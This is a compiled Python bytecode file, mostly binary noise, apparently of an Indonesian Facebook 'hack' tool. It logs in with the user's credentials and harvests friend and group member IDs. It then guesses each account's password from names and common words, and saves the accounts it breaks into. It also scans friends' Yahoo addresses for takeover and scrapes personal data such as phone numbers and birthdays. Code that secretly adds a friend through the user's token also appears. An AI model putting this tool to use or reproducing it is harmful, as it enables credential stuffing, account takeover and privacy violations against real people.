�
�^c           @   s%  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l
 m Z d  d l m Z d  d l m Z e e � e j d � e j �  Z e j e � e j e j j �  d d �d" g e _ d
 �  Z d �  Z d �  Z d
 �  Z d Z d �  Z  d Z! g  Z" g  Z# g  a$ g  a% g  Z& g  Z' d Z( d Z) d �  Z* d �  Z+ d �  Z, d �  Z- d �  Z. d �  Z/ d �  Z0 d �  Z1 d �  Z2 d �  Z3 d �  Z4 d �  Z5 d �  Z6 d  �  Z7 e8 d! k r!e* �  n  d S(#   i����N(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j �  d  S(   Ns   [1;96m[!] [1;91mExit(   t   ost   syst   exit(    (    (    s   /sdcard/uye.pyt   keluar   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t | � d � | 7} q Wt | � S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   /sdcard/uye.pyt   acak   s
    
0c         C   s~   d } xA | D]9 } | j  | � } |  j d | d t d | � � }  q
 W|  d 7}  |  j d d � }  t j j |  d � d  S(   NR	   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   j(    (    s   /sdcard/uye.pyR       s    
(
c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g�������?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/uye.pyt   jalan*   s    
s�    
[32m….._\____________________,,__
[32m…./ `–│││││││││  [0;1mMejuah-Juah -->
[32m…/_==o ______________[0;1mHoras Medan -->
[32m…..),—.(_(__) /
[32m….// (\) ),——
[32m…//___//
[32m../`—-’ / …
[32m./____ / … 
[32m╔═════════════════=========
[32m *[0;1mAuthor kangcoli
[33m *[0;1mDecompiled bye jepri barus
[32m *[0;1mYoutube Bang Jep
[32m╚═════════════════=========c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   .   s   ..  s   ... s)   
[1;96m[●] [1;93mSedang masuk [1;97mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/uye.pyt   tik@   s
    
 
 i    s
   [31mNot Vulns	   [32mVulnc          C   s�   t  j d � t  j d � d GHd GHd GHd GHt d � }  t d � } |  d	 k r� | d
 k r� d GHt  j d � t j d
 � t �  n& d GHt  j d � t j d
 � t �  d  S(   Nt   clears   xdg-open https://taut.pro/FeGhs8   [33;1mLisensi Telah Di update tanggal [0;1m06-04-2020
s,   [33;1mSilahkan Download Kembali Lisensinya
s3   [33;1mDi website yang barusan di alihkan otomatis
s+   [0;1mLisensi Akan di update 3 hari sekali
s+   [1;96m[*] [1;97mUsername [1;91m: [1;92ms+   [1;96m[*] [1;97mPassword [1;91m: [1;92mt   kangt   colis!   [1;96m[✓] [1;92mLogin successsA   xdg-open https://www.youtube.com/channel/UCwdOY4YQZW5ejDEpo1SolHQi   s   [1;96m[!] [1;91mSalah Bosku!!(   R   t   systemt	   raw_inputR   R   t   logint   LoginSC(   t   usernamet   password(    (    s   /sdcard/uye.pyt   loginSCP   s"    






c          C   s�  t  j d � y t d d � }  t �  Wn�t t f k
 r�t  j d � t GHd d GHd GHd GHd GHt d	 � } t d
 � } t �  y t	 j d � Wn  t
 j k
 r� d GHt �  n Xt
 t	 j _ t	 j d
 d � | t	 j d <| t	 j d <t	 j �  t	 j �  } d | k riy.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d  d! 6| d 6d" d# 6d$ d% 6} t j d& � } | j | � | j �  } | j i | d' 6� d( } t j | d) | �} t j | j � }	 t d d* � }
 |
 j |	 d+ � |
 j �  d, GHt j d- |	 d+ � t  j d. � t �  Wqit j  j! k
 red GHt �  qiXn  d/ | k r�d0 GHt  j d1 � t  j d2 � t" j# d3 � t �  q�d4 GHt  j d2 � t" j# d3 � t$ �  n Xd  S(5   NR$   s	   login.txtt   ri*   s   [1;96m=s1   [34;1mSilahkan Daftar fb baru dari google chromes.   [34;1mAgar tidak terkena chekpoint saat logins7   [1;96m[✓] [32mLOGIN AKUN FACEBOOK ANDA [1;96m[✓]s+   [1;96m[+] [1;93mID/Email [1;91m: [1;92ms+   [1;96m[+] [1;93mPassword [1;91m: [1;92ms   https://m.facebook.coms$   
[1;96m[!] [1;91mTidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyR,   t   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens#   
[1;96m[✓] [1;92mLogin BerhasilsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=sA   xdg-open https://www.youtube.com/channel/UCwdOY4YQZW5ejDEpo1SolHQt
   checkpoints7   
[1;96m[!] [1;91mSepertinya akun anda kena checkpoints(   xdg-open https://autoratio.com/n2iqmyGv8s   rm -rf login.txti   s'   
[1;96m[!] [1;91mPassword/Email salah(%   R   R'   t   opent   menut   KeyErrort   IOErrort   logoR(   R#   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt
   exceptionsR   R   R   R)   (   t   tokett   idt   pwdt   urlRA   t   dataR   t   aR.   R   t   unikers(    (    s   /sdcard/uye.pyR)   d   sp    

	


S








c          C   su  t  j d � y t d d � j �  }  WnD t k
 rl t  j d � d GHt  j d � t j d � t �  n Xy= t j	 d |  � } t
 j | j � } | d } | d	 } Wnf t
 k
 r� t  j d � d GHt  j d � t j d � t �  n# t j j k
 rd
 GHt �  n Xt  j d � t GHd d GHd
 | d GHd | d GHd d GHd GHd GHd GHd GHd GHt �  d  S(   NR$   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameRa   s#   [1;96m[!] [1;91mTidak ada koneksii*   s   [1;96m=s7   [1;96m[[1;97m✓[1;96m][1;93m Nama [1;91m: [1;92ms   [1;97m                  s7   [1;96m[[1;97m✓[1;96m][1;93m ID   [1;91m: [1;92ms   [1;97m              s   [32m1.[0;1m Hack facebooks.   [32m2.[0;1m Lihat daftar grup               s+   [32m3.[0;1m Informasi akun               s(   [32m4.[0;1m Yahoo clone               s"   
[32m0.[34;1m Logout            (   R   R'   RE   t   readRH   R   R   R   RX   RY   RZ   R[   R\   RG   R)   R_   R   RI   t   pilih(   R`   t   otwRe   t   namaRa   (    (    s   /sdcard/uye.pyRF   �   sF    











	

	c          C   s�   t  d � }  |  d k r' d GHt �  n� |  d k r= t �  n� |  d k rS t �  nr |  d k ri t �  n\ |  d k r t �  nF |  d k r� t j d	 � t d
 � t j d � t	 �  n d GHt �  d  S(   Ns   
[1;97m >>> [1;97mR
   s&   [1;96m[!] [1;91mIsi yang benar boskuR7   t   2t   3t   4R=   R$   s   Menghapus tokens   rm -rf login.txt(
   R(   Ri   t   supert   grupsayat	   informasit   yahooR   R'   R    R   (   Rf   (    (    s   /sdcard/uye.pyRi   �   s&    








c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd
 GHt
 �  d  S(   NR$   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   i*   s   [1;96m=s%   [32m1.[0;1m Crack dari daftar temans/   [32m2.[0;1m Crack dari teman dari teman (✓)s.   [32m3.[0;1m Crack dari member grup ( error )s   [32m4.[0;1m Crack dari files   
[32m0.[34;1m Kembali(   R   R'   RE   Rh   R`   RH   R   R   R   RI   t   pilih_super(    (    (    s   /sdcard/uye.pyRo   �   s"    




	c          C   s:  t  d � }  |  d k r' d GHt �  n.|  d k r� t j d � t GHd d GHt d � t j d	 t � } t	 j
 | j � } x�| d
 D] } t j
 | d � q� Wn�|  d k r�t j d � t GHd d GHt  d
 � } y> t j d | d t � } t	 j
 | j � } d | d GHWn' t k
 r@d GHt  d � t �  n Xt d � t j d | d t � } t	 j
 | j � } x�| d
 D] } t j
 | d � q�Wn�|  d k r�t j d � t GHd d GHt  d � } y> t j d | d t � } t	 j
 | j � }	 d |	 d GHWn' t k
 r;d GHt  d � t �  n Xt d � t j d | d t � }
 t	 j
 |
 j � } x� | d
 D] } t j
 | d � q~Wn� |  d k r3t j d � t GHd d GHyC t  d � } x0 t | d � j �  D] }
 t j
 |
 j �  � q�WWqUt k
 r/d GHt  d  � t �  qUXn" |  d! k rIt �  n d GHt �  d" t t t � � GHd# d$ d% g } x0 | D]( } d& | Gt j j �  t j d' � q�WHd( GHd) GHd d GHd* �  } t d+ � } | j | t � d, GHd- t t t � � d. t t t � � GHd/ GHt  d � t j d0 � t �  d  S(1   Ns   
[1;97m >>> [1;97mR
   s    [1;96m[!] [1;91mIsi yang benarR7   R$   i*   s   [1;96m=s+   [1;96m[✺] [1;93mMengambil ID [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Rd   Ra   Rl   s3   [1;96m[+] [1;93mMasukan ID teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s=   [1;96m[[1;97m✓[1;96m] [1;93mNama teman[1;91m :[1;97m Rg   s(   [1;96m[!] [1;91mTeman tidak ditemukan!s   
[1;96m[[1;97mKembali[1;96m]s   /friends?access_token=Rm   s3   [1;96m[+] [1;93mMasukan ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;96m[[1;97m✓[1;96m] [1;93mNama group [1;91m:[1;97m s'   [1;96m[!] [1;91mGroup tidak ditemukans5   /members?fields=name,id&limit=999999999&access_token=Rn   s5   [1;96m[+] [1;93mMasukan nama file  [1;91m: [1;97mR.   s&   [1;96m[!] [1;91mFile tidak ditemukans!   
[1;96m[ [1;97mKembali [1;96m]R=   s*   [1;96m[+] [33;1mTotal ID [1;91m: [0;1ms   .   s   ..  s   ... s<   
[1;96m[[33;1m✸[1;96m] [33;1mLagi Proses bosku [1;97mi   s;   [1;96m[!] [0;1mjika hasil cp, Harap simpan selama 2 hari sD   [1;96m[!] [0;1mdalam 2 hari hasil cp akan pulih dengan sendirinya c         S   sT  |  } y t  j d � Wn t k
 r* n Xyt j d | d t � } t j | j � } | d d } t	 j
 d | d | d � } t j | � } d	 | k r� d
 | d GHd | GHd
 | d GHt j
 | | � nkd | d k rWd | d GHd | GHd | d GHt d d � } | j d | d | d � | j �  t j
 | | � n�| d d } t	 j
 d | d | d � } t j | � } d	 | k r�d
 | d GHd | GHd
 | d GHt j
 | | � nod | d k rSd | d GHd | GHd | d GHt d d � } | j d | d | d � | j �  t j
 | | � n�| d d }	 t	 j
 d | d |	 d � } t j | � } d	 | k r�d
 | d GHd | GHd
 |	 d GHt j
 | |	 � nsd | d k rOd | d GHd | GHd |	 d GHt d d � } | j d | d |	 d � | j �  t j
 | |	 � n�| d d }
 t	 j
 d | d |
 d � } t j | � } d	 | k r�d
 | d GHd | GHd
 |
 d GHt j
 | |
 � nwd | d k rKd | d GHd | GHd |
 d GHt d d � } | j d | d |
 d � | j �  t j
 | |
 � n�d } | j d d � } t	 j
 d | d | d � } t j | � } d	 | k r�d
 | d GHd | GHd
 | d GHt j
 | | � nqd | d k rQd | d GHd | GHd | d GHt d d � } | j d | d | d � | j �  t j
 | | � n� d }
 t	 j
 d | d |
 d � } t j | � } d	 | k r�d | d GHd | GHd  |
 d GHt j
 | |
 � n} d | d k rEd | d GHd | GHd |
 d GHt d d � } | j d | d |
 d � | j �  t j
 | |
 � n  Wn n Xd  S(!   Nt   outs   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RC   s*   [33;1m[cp] [0;1mNama [1;91m    : [0;1mRg   s+   [33;1m[➹] [0;1mID [1;91m      : [0;1ms+   [33;1m[➹] [0;1mPassword [1;91m: [0;1ms   
s   www.facebook.comt	   error_msgs(   [32m[OK] [0;1mNama [1;91m    : [0;1ms)   [32m[➹] [0;1mID [1;91m      : [0;1ms)   [32m[➹] [0;1mPassword [1;91m: [0;1ms   out/super_cp.txtRe   s   ID:s    Pw:t   12345t	   last_namet   kontolt   /R
   t   Sayangs(   [33m[cp] [0;1mNama [1;91m    : [0;1ms)   [33m[➹] [0;1mID [1;91m      : [0;1ms)   [33m[➹] [0;1mPassword [1;91m: [0;1m(   R   t   mkdirt   OSErrorRX   RY   R`   RZ   R[   R\   t   urllibt   urlopent   loadt   okst   appendRE   R   R]   t   cekpointR   (   t   argt   userRe   t   bt   pass1Rd   t   qt   cekt   pass2t   pass3t   pass4t   birthdayt   pass5t   pass6(    (    s   /sdcard/uye.pyt   main?  s�    

	

	


	

	


	

	


	

	


	

	


	

	

i   s5   [1;96m[[1;97m✓[1;96m] [1;92mSelesai [1;97m....s3   [33;1m[+] [33;1mTotal CP/[32mOK [1;91m: [33;1ms
   [32m/[1;93msD   [1;96m[+] [1;92mCP File tersimpan [1;91m: [1;97mout/super_cp.txtsA   xdg-open https://www.youtube.com/channel/UCwdOY4YQZW5ejDEpo1SolHQ(    R(   Rs   R   R'   RI   R    RX   RY   R`   RZ   R[   R\   Ra   R�   RG   Ro   RE   t	   readlinest   stripRH   RF   R   R   R   R   R   R   R   R    t   mapR�   R�   (   t   peakR.   R   t   st   idtt   jokt   opR   t   idgt   aswt   ret   pt   idlistt   lineR!   R"   R�   (    (    s   /sdcard/uye.pyRs   �   s�    

	

	



	



	



 
 		y)

c          C   s-  t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j d � Wn t	 k
 r� n Xt  j d � t
 GHd d	 GHy� t j d
 |  � } t
 j | j � } xz | d D]n } | d } | d
 } t d d � } t j | � | j | d � d GHd t | � GHd t | � d GHq� Wd d	 GHd t t � GHd GH| j �  t d � t �  Wn� t t f k
 r�d GHt d � t �  n| t k
 r�t  j d � d GHt d � t �  nI t j j k
 rd GHt �  n' t k
 r(d GHt d � t �  n Xd  S(   NR$   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rt   i*   s   [1;96m=s2   https://graph.facebook.com/me/groups?access_token=Rd   Rg   Ra   s   out/Grupid.txtR   s   
s   [1;96m[✓] [1;92mGROUP SAYAs(   [1;96m[➹] [1;97mID  [1;91m: [1;92ms(   [1;96m[➹] [1;97mNama[1;91m: [1;92ms0   [1;96m[+] [1;92mTotal Group [1;91m:[1;97m %ss:   [1;96m[+] [1;92mTersimpan [1;91m: [1;97mout/Grupid.txts   
[1;96m[[1;97mKembali[1;96m]s   [1;96m[!] [1;91mTerhentis'   [1;96m[!] [1;91mGroup tidak ditemukans%   [1;96m[✖] [1;91mTidak ada koneksis   [1;96m[!] [1;91mError(   R   R'   RE   Rh   RH   R   R   R   R}   R~   RI   RX   RY   RZ   R[   R\   t   listgrupR�   R   R   R   R]   R(   RF   t   KeyboardInterruptt   EOFErrorRG   t   removeR_   R   (   R`   t   uht   gudR�   Rk   Ra   t   f(    (    s   /sdcard/uye.pyRp   �  sb    





	


	










c          C   s�  t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t GHd d GHt	 d	 � } t
 d
 � t j d |  � } t
 j | j � } x�| d D]�} | | d
 k s� | | d k r� t j d | d d |  � } t
 j | j � } d d GHy d | d
 GHWn t k
 rJd GHn Xy d | d GHWn t k
 rtd GHn Xy d | d GHWn t k
 r�d GHn Xy d | d GHWn t k
 r�d GHn Xy d | d d
 GHWn t k
 r�d GHn Xy d | d  GHWn t k
 r d! GHn XyL d" GHx@ | d# D]4 } y d$ | d% d
 GHWq4t k
 rgd& GHq4Xq4WWn t k
 r�n Xt	 d' � t �  q� q� Wd( GHt	 d' � t �  d  S()   NR$   s	   login.txtR.   s   [1;91m[!] Token invalids   rm -rf login.txti   i*   s   [1;96m=s2   [1;96m[+] [1;93mMasukan ID/Nama[1;91m : [1;97ms.   [1;96m[✺] [1;93mTunggu sebentar [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Rd   Rg   Ra   s   https://graph.facebook.com/s   ?access_token=i+   s+   [1;96m[➹] [1;93mNama[1;97m          : s9   [1;96m[?] [1;93mNama[1;97m          : [1;91mTidak adas+   [1;96m[➹] [1;93mID[1;97m            : s9   [1;96m[?] [1;93mID[1;97m            : [1;91mTidak adas+   [1;96m[➹] [1;93mEmail[1;97m         : R0   s9   [1;96m[?] [1;93mEmail[1;97m         : [1;91mTidak adas+   [1;96m[➹] [1;93mNo HP[1;97m         : t   mobile_phones9   [1;96m[?] [1;93mNo HP[1;97m         : [1;91mTidak adas+   [1;96m[➹] [1;93mTempat tinggal[1;97m: t   locations9   [1;96m[?] [1;93mTempat tinggal[1;97m: [1;91mTidak adas+   [1;96m[➹] [1;93mTanggal lahir[1;97m : R�   s9   [1;96m[?] [1;93mTanggal lahir[1;97m : [1;91mTidak adas+   [1;96m[➹] [1;93mSekolah[1;97m       : t	   educations#   [1;91m                   ~ [1;97mt   schools,   [1;91m                   ~ [1;91mTidak adas   
[1;96m[[1;97mKembali[1;96m]s(   [1;96m[✖] [1;91mAkun tidak ditemukan(   R   R'   RE   Rh   RH   R   R   R   RI   R(   R    RX   RY   RZ   R[   R\   RG   RF   (   R`   t   aidR.   t   cokR   R   R   R�   (    (    s   /sdcard/uye.pyRq   �  sv    




	
 	
 	
 	
 	
 	
 	
 	
 
 


c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd
 GHt
 �  d  S(   NR$   s	   login.txtR.   s   [1;91m[!] Token invalids   rm -rf login.txti   i*   s   [1;96m=s(   [1;97m1.[1;93m Clone dari daftar temans!   [1;97m2.[1;93m Clone dari temans(   [1;97m3.[1;93m Clone dari member groups    [1;97m4.[1;93m Clone dari files   
[1;91m0.[1;91m Kembali(   R   R'   RE   Rh   R`   RH   R   R   R   RI   t   clone(    (    (    s   /sdcard/uye.pyRr   ,  s"    




	c          C   s�   t  d � }  |  d k r  d GHns |  d k r6 t �  n] |  d k rL t �  nG |  d k rb t �  n1 |  d k rx t �  n |  d k r� t �  n d GHd  S(	   Ns
   
[1;97m >>> R
   s    [1;96m[!] [1;91mIsi yang benarR7   Rl   Rm   Rn   R=   (   R(   t   clone_dari_daftar_temant   clone_dari_temant   clone_dari_member_groupt   clone_dari_fileRF   (   t   embuh(    (    s   /sdcard/uye.pyR�   @  s    




c          C   s�  t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j	 d � Wn t
 k
 r� n Xt  j d � t GHg  }  d	 } d
 d GHt d � t
 j d
 t � } t j | j � } t d � d GHd
 d GHx�| d D]�} | d 7} |  j | � | d } | d } t
 j d | d t � } t j | j � } y9| d }	 t j d � }
 |
 j |	 � j �  } d | k r�t j d � t t j _ t j d d	 � |	 t d <t j �  j �  } t j d � }
 y |
 j | � j �  } Wn
 w� n Xd | k r�d GHd | GHd |	 GHd  | d! GHt d" d# � } | j d$ | d% | d& |	 d' � | j �  t j |	 � q�n  Wq� t  k
 r�q� Xq� Wd
 d GHd( GHd) t! t" t � � GHd* GHt# d+ � t$ �  d  S(,   Nt   resets	   login.txtR.   s   [1;91m[!] Token Invalids   rm -rf login.txti   Rt   R$   i    i*   s   [1;96m=s<   [1;96m[[1;97m✺[1;96m] [1;93mMengambil email [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s2   [1;96m[[1;97m✺[1;96m] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zRd   Ra   Rg   s   https://graph.facebook.com/s   ?access_token=R0   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR/   R+   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   [1;96m[✓] [1;92mVULNs)   [1;96m[➹] [1;97mID   [1;91m: [1;92ms)   [1;96m[➹] [1;97mEmail[1;91m: [1;92ms)   [1;96m[➹] [1;97mNama [1;91m: [1;92ms   
s   out/MailVuln.txtRe   s   Nama : s
   
ID        : s
   
Email  : s   

s5   [1;96m[[1;97m✓[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msA   [1;96m[+] [1;92mFile tersimpan [1;91m:[1;97m out/MailVuln.txts   
[1;96m[[1;97mKembali[1;96m](%   R   R'   RE   Rh   R`   RH   R   R   R   R}   R~   RI   R    RX   RY   RZ   R[   R\   R�   R�   t   compilet   searcht   groupRJ   RM   RN   RO   RP   RR   R   R]   t   berhasilRG   R   R   R(   RF   (   t   mpsht   jmlt   temant   kimakR   Ra   Rk   t   linksR   t   mailRr   Rj   t   klikR�   t   pekt   save(    (    s   /sdcard/uye.pyR�   R  s|    





	

	






		
%

	
c          C   sb  t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j	 d � Wn t
 k
 r� n Xt  j d � t GHg  }  d } d	 d
 GHt d � } y> t
 j d | d
 t � } t j | j � } d | d GHWn' t k
 rd GHt d � t �  n Xt d � t
 j d | d t � } t j | j � } t d � d GHd d
 GHx�| d D]�} | d 7} |  j | � | d } | d }	 t
 j d | d
 t � }
 t j |
 j � } y5| d } t j d � }
 |
 j | � j �  } d | k rt j d � t t j _ t j d d � | t d <t j �  j �  } t j d � } y | j | � j �  } Wn
 wzn Xd  | k rd! GHd" | GHd# | GHd$ |	 GHt d% d& � } | j  d' |	 d( | d) | d* � | j! �  t" j | � qn  Wqzt k
 r qzXqzWd	 d
 GHd+ GHd, t# t$ t" � � GHd- GHt d � t �  d  S(.   NR$   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rt   i    i*   s   [1;96m=s3   [1;96m[+] [1;93mMasukan ID teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;96m[[1;97m✓[1;96m] [1;93mNama[1;91m :[1;97m Rg   s'   [1;96m[!] [1;91mTeman tidak ditemukans   
[1;96m[[1;97mKembali[1;96m]s.   [1;96m[✺] [1;93mMengambil email [1;97m...s   /friends?access_token=s$   [1;96m[✺] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zi+   Rd   Ra   R0   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR/   R+   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   [1;96m[✓] [1;92mVULNs)   [1;96m[➹] [1;97mID   [1;91m: [1;92ms)   [1;96m[➹] [1;97mEmail[1;91m: [1;92ms)   [1;96m[➹] [1;97mNama [1;91m: [1;92ms   out/TemanMailVuln.txtRe   s   Nama : s
   
ID        : s
   
Email  : s   

s5   [1;96m[[1;97m✓[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msF   [1;96m[+] [1;92mFile tersimpan [1;91m:[1;97m out/TemanMailVuln.txt(%   R   R'   RE   Rh   R`   RH   R   R   R   R}   R~   RI   R(   RX   RY   RZ   R[   R\   RG   RF   R    R�   R�   R�   R�   R�   RJ   RM   RN   RO   RP   RR   R   R]   R�   R   R   (   R�   R�   R�   R�   R�   R�   R�   R   Ra   Rk   R�   R   R�   Rr   Rj   R�   R�   R�   (    (    s   /sdcard/uye.pyR�   �  s�    





	



	






			%

	
c          C   sb  t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j	 d � Wn t
 k
 r� n Xt  j d � t GHg  }  d } d	 d
 GHt d � } y> t
 j d | d
 t � } t j | j � } d | d GHWn' t k
 rd GHt d � t �  n Xt d � t
 j d | d t � } t j | j � } t d � d GHd	 d
 GHx�| d D]�} | d 7} |  j | � | d } | d } t
 j d | d t � }	 t j |	 j � }
 y5|
 d } t j d � } | j | � j �  }
 d |
 k rt j d � t t j _ t j d d � | t d <t j �  j �  } t j d  � } y | j | � j �  } Wn
 wzn Xd! | k rd" GHd# | GHd$ | GHd% | GHt d& d' � } | j  d( | d) | d* | d+ � | j! �  t" j | � qn  Wqzt k
 r qzXqzWd	 d
 GHd, GHd- t# t$ t" � � GHd. GHt d � t �  d  S(/   NR$   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rt   i    i*   s   [1;96m=s3   [1;96m[+] [1;93mMasukan ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;96m[[1;97m✓[1;96m] [1;93mNama group [1;91m:[1;97m Rg   s'   [1;96m[!] [1;91mGroup tidak ditemukans   
[1;96m[[1;97mKembali[1;96m]s.   [1;96m[✺] [1;93mMengambil email [1;97m...s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=s$   [1;96m[✺] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zRd   Ra   s   ?access_token=R0   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR/   R+   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   [1;96m[✓] [1;92mVULNs)   [1;96m[➹] [1;97mID   [1;91m: [1;92ms)   [1;96m[➹] [1;97mEmail[1;91m: [1;92ms)   [1;96m[➹] [1;97mNama [1;91m: [1;92ms   out/GrupMailVuln.txtRe   s   Nama : s
   
ID        : s
   
Email  : s   

s5   [1;96m[[1;97m✓[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msE   [1;96m[+] [1;92mFile tersimpan [1;91m:[1;97m out/GrupMailVuln.txt(%   R   R'   RE   Rh   R`   RH   R   R   R   R}   R~   RI   R(   RX   RY   RZ   R[   R\   RG   RF   R    R�   R�   R�   R�   R�   RJ   RM   RN   RO   RP   RR   R   R]   R�   R   R   (   R�   R�   Ra   R.   R�   R�   R�   R   Rk   R�   R   R�   Rr   Rj   R�   R�   R�   R�   (    (    s   /sdcard/uye.pyR�   �  s�    





	



	






			%

	
c          C   s�  t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j	 d � Wn t
 k
 r� n Xt  j d � t GHd d	 GHt d
 � }  y t |  d � } | j
 �  } Wn' t k
 r� d GHt d � t �  n Xg  } d
 } t d � d GHd d	 GHt |  d � j
 �  } x<| D]4} | j d d � } | d 7} | j | � t j d � } | j | � j �  } d | k r5t j d � t t j _ t j d d
 � | t d <t j �  j �  } t j d � }	 y |	 j | � j �  }
 Wn
 q5n Xd |
 k rid GHd | GHt d d � } | j d | d � | j �  t j | � qiq5q5Wd d	 GHd GHd  t t  t � � GHd! GHt d � t �  d  S("   NR$   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rt   i*   s   [1;96m=s,   [1;96m[+] [1;93mNama File [1;91m: [1;97ms&   [1;96m[!] [1;91mFile tidak ditemukans   
[1;96m[[1;97mKembali[1;96m]i    s$   [1;96m[✺] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zs   
R
   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR/   R+   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   [1;96m[✓] [1;92mVULNs)   [1;96m[➹] [1;97mEmail[1;91m: [1;92ms   out/MailVuln.txtRe   s   Email: s   

s5   [1;96m[[1;97m✓[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msE   [1;96m[+] [1;92mFile Tersimpan [1;91m:[1;97m out/FileMailVuln.txt(!   R   R'   RE   Rh   R`   RH   R   R   R   R}   R~   RI   R(   R�   RF   R    R   R�   R�   R�   R�   R�   RJ   RM   RN   RO   RP   RR   R   R]   R�   R   R   (   t   filest   totalR�   R�   R�   t   pwRr   Rj   R�   R�   R�   R�   (    (    s   /sdcard/uye.pyR�   )  sv    





	


	




	
	
t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(9   R   R   R   t   datetimeR   RT   R�   t	   threadingRZ   R   t	   cookielibRX   RK   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRJ   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
